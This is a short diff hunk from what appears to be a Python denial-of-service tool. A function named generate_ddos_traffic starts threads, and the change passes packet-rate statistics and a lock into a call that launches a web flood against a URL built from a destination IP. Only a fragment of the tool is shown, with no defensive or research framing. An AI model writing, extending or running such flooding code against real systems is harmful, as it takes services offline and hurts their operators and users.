@@ -81,7 +81,7 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
         thread.start()
     
     import web_ddos
-    web_ddos.launch_web_ddos(f"http://{destination_ip}")
+    web_ddos.launch_web_ddos(f"http://{destination_ip}", packets_per_second, lock)
 
 def print_statistics(packets_per_second, lock):
     global start_time
